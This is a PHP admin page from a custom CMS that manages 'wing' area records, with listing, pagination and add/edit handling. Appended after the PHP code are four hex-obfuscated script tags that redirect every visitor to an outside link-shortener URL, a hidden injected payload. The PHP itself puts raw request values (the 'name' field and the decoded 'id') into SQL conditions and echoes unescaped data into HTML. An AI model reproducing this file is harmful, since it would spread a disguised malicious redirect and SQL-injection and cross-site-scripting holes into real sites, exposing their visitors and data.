<?php
define("ZW_IN", 'SETUP');
require_once("helper.php");

$msg    =  isset($_GET['msg']) ? $_GET['msg'] : '';
$id     = base64_decode($_GET['id']);
class myCms extends Cms 
{
    function registerAjaxFunctions()
    {
        $this->xajax->registerFunction("get_Listing");
        $this->xajax->registerFunction("update_status");
        $this->xajax->registerFunction("deleteRow");
        $this->xajax->registerFunction("editMode");
        $this->xajax->registerFunction("sorting");
        $this->xajax->registerFunction("sortTitle");
    }
}
$objMisc = new myCms();
$objMisc->initializeAjax(false,true);
$objMisc->dbFunc->parameters ="&sortOrder=".$sortOrder."&sortBy=".$sortBy ;
$objMisc->rec_pp = 20;
$objMisc->dbFunc->ajax_pagin = true;

if($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['submit'])){
        $rowArray = array(	'NAME'            => $_POST['name'],
        					'HEADOFFICE_ID'   => $_POST['headoffice_id'],
                			'DESCRIPTION'     => addslashes($_POST['description']),
                			'ADDED_BY'        => $_SESSION['USER_NAME'],
                			'ADDED_TIME'      => date('Y-m-d H:i:s'));
                 // print_r($rowArray);exit;
    $cond       = "";
    $cond       = " NAME = '$_POST[name]'";
    $recdata    = $objMisc->GiveValue($cond,"WING_ID","wing_master"); 
    
     if($id)
	{
              if($recdata!='')
            {        
                $_SESSION['msg'] = 5;
                if(!$_POST['WING_ID'])
                    {
                        $rowArray = "";
                        $rowArray = $_POST;
                    }
            }
        else
        {
            $where         =   "WING_ID =".$id;
            $rowArray1 = array(	'NAME'    		  => $_POST['name'],
                                'HEADOFFICE_ID'   => $_POST['headoffice_id'],
                                'DESCRIPTION'     => addslashes($_POST['description']),
                    			'UPDATED_BY'      => $_SESSION['USER_NAME'],
                    			'UPDATED_TIME'    => date('Y-m-d H:i:s'));
                    //print_r($rowArray1);exit;
    		$val   = $objMisc->update("wing_master",$rowArray1,$where);
            $_SESSION['msg'] = 2;
    		header("Location:wingmaster.php?page=".$_REQUEST['page']."");
            exit;
        }
	} 
        else
        {
            if($recdata!='')
            {
                $_SESSION['msg'] = 5;
                if(!$_POST['WING_ID'])
                {
                $rowArray = "";
                $rowArray = $_POST;
                }
            }
        else 
        {
                $val = $objMisc->insert("wing_master",$rowArray);
                $_SESSION['msg'] = 1;
                header("location:wingmaster.php");
                exit;
        }
    }
}

$msg = isset($_SESSION['msg']) ? $_SESSION['msg'] : $msg;
unset($_SESSION['msg']);

switch ($msg)
{
	case 1:
		$msg = "Area added successfully.";
    break;
    case 2:
		$msg = "Record updated successfully.";
    break;
    case 3:
		$msg = "Record has been deleted successfully.";
	break;    
    case 4:
        $errormsg = "Area name already exists.";
        $msg = "";
    break;
     case 5:
        $errormsg = "Area name already exists.";
        $msg = "";
    break;
}

if($id){
    $where = 'WING_ID = '.$id;
    $rowArray = $objMisc->getRow("wing_master",$where);
}
$wherethis = " 1=1 ORDER BY `WING_ID` DESC";
$classRecord = $objMisc->getAllRecordsPaging("*","wing_master",$wherethis);
$i  = 1;
$pagin_recs = "";
$pagin_recs = '<input type="hidden" value="" id="checkStatus" name="checkStatus"><thead><tr><th width="15%">Area</th><th width="15%">Headoffice Name</th><th width="40%">Description</th><th>Action';

if(is_array($classRecord[1])){ 
        $pagin_recs .='&nbsp;&nbsp;<a href="javascript:;" title="Check All"  onclick="check_all(\'artCatCount\',\'artCatCheckbox\')"><input type="checkbox"></a>&nbsp;&nbsp;All';
        
        $pagin_recs .= '&nbsp;&nbsp;<a href="javascript:;" title="Delete" onclick="return chkOptions_all(\'Delete\',frmListing,\'artCatCheckbox\',\'artCatCount\')" class="btn btn-danger">Delete</a>';
    
}
$pagin_recs .= '</th></tr></thead><tbody>';             
    if(is_array($classRecord[1]) && !empty($classRecord[1]))
    { $i=1;
       foreach ($classRecord[1] as $k => $rowRec)
        {       
            if($k%2==0) 
            $pagin_recs .= '<tr class="odd gradeX">';
            else
            $pagin_recs .= '<tr class="even gradeX">';
            
            $pagin_recs .='<td>'.$rowRec['name'].'</td>';
            $pagin_recs .='<td>'.$objMisc->GiveValue("HEADOFFICE_ID='$rowRec[headoffice_id]'",'NAME','headoffice_master').'</td>';
            $pagin_recs .='<td>'.$rowRec['description']."</br>".'</td>';
            $pagin_recs .='<td> <input type="hidden" name="enumStatus'.$rowRec['wing_id'].'" id="enumStatus'.$rowRec['wing_id'].'"  value="'.$rowRec['status'].'">&nbsp;';
           // echo $_SESSION['USER_ID'];
                    if($rowRec['status']=='A')
                    {
                       $pagin_recs .= '<input type="image" src="images/active-btn.gif" name="imgStatus'.$rowRec['wing_id'].'" id="imgStatus'.$rowRec['wing_id'].'" alt="Deactivate" title="Deactivate" border="0" onclick="return myChangeStatus(this.form,'.$rowRec['wing_id'].');">&nbsp;';
                    }
                    else
                    {
                       $pagin_recs .= '<input type="image" src="images/deactive-btn.gif" name="imgStatus'.$rowRec['wing_id'].'" id="imgStatus'.$rowRec['wing_id'].'" alt="Activate" title="Activate" border="0" onclick="return myChangeStatus(this.form,'.$rowRec['wing_id'].');">&nbsp;';
                    }
                
                $pagin_recs .='<a href="headoffice.php?id='.base64_encode($rowRec['wing_id']).'&page='.$_GET['page'].'"><img src="images/edit-btn.gif"  alt="Edit" title="Edit"  border="0"></a>&nbsp;';
                
                $pagin_recs .='<input type="checkbox" name="artCatCheckbox[]" value="'.$rowRec['wing_id'].'" id="artCatCheckbox_'.$i.'">&nbsp;';
                
                $pagin_recs .= '</td></tr>';
                $i++;
        }
          $pagin_recs  .= '<input type="hidden" value="'.$i.'" name="artCatCount" id="artCatCount">';
          if($classRecord[2]>$objMisc->rec_pp){
            $pagin_recs  .= '<tr><td colspan="3">'.$classRecord[0].'</td></tr>';
          }
            $pagin_recs  .= '</tbody>';
    } else {
        $pagin_recs .= '<tr class="odd gradeX"><td colspan="3" align="center">No Record Found</td></tr></tbody>';
    }
    
  
if(isset($_GET['id']) && !empty($_GET['id'])){
    $pageheading = "Edit Area Information";
}else{
   $pageheading = "Add New Area"; 
}

$where           =   " 1 = 1 and STATUS = 'A' order by HEADOFFICE_ID";
$headofficeArray      =   $objMisc->myFunc->fnWriteOptionList($rowArray['headoffice_id'],'NAME,HEADOFFICE_ID','headoffice_master',$where,0,0,0);  
$smartyVars['headofficeArray']      =   $headofficeArray;
$smartyVars['errormsg']     		=   $errormsg;
$smartyVars['add']          		=   $add;
$smartyVars['group']       		 	=   $id;
$smartyVars['rowRec']       		=   $rowArray;
$smartyVars['pageheading']  		=   $pageheading;
$smartyVars['classData']    		=   $pagin_recs;
$smartyVars['msg']         		 	=   $msg;
$smartyVars['page']         		=   $_REQUEST['page'];

$objMisc->displayPage("header,wingmaster,footer",$smartyVars);
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>